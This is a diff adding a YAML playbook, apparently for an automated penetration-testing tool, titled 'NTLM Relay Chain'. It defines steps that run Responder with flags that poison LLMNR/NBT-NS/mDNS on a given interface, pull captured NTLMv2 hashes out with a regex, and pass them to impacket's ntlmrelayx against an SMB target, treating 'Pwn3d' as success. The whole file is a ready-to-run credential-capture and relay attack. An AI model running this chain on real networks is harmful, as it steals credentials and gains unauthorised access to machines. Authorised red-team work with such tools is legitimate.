@@ -1,0 +1,39 @@
+name: "NTLM Relay Chain"
+description: "Modern network attack: poison LLMNR/NBT-NS with Responder, relay captured NTLMv2 hashes to SMB, achieve relayed authentication."
+category: network
+attack_vector: "LLMNR/NBT-NS poisoning → NTLM relay → SMB auth"
+variables:
+  interface:
+    required: true
+    description: "Network interface (e.g. eth0)"
+  target:
+    required: false
+    description: "Relay target IP (SMB server)"
+cutting_edge: true
+references: ["Responder README", "ntlmrelayx usage", "MITRE ATT&CK T1557.001"]
+
+steps:
+  - name: "responder_poison"
+    tool: "responder_poison"
+    description: "Poison LLMNR/NBT-NS/mDNS to capture NTLM hashes"
+    args:
+      interface: "{{interface}}"
+      options: "-w -r -f -v"
+    expected_output: 'NTLMv2|NTLMv2-SSP|\[!\]'
+    timeout: 300
+    gate: false
+    retries: 1
+    extracts:
+      - var: "ntlm_hash"
+        regex: "NTLMv2-SSP Hash[^\\n]*"
+
+  - name: "relay_smb"
+    tool: "impacket_tools"
+    description: "Relay captured NTLM hashes to SMB"
+    args:
+      tool: "ntlmrelayx"
+      target: "{{target}} -smb2support"
+    expected_output: "Pwn3d|hash|done"
+    timeout: 300
+    gate: false
+    retries: 1
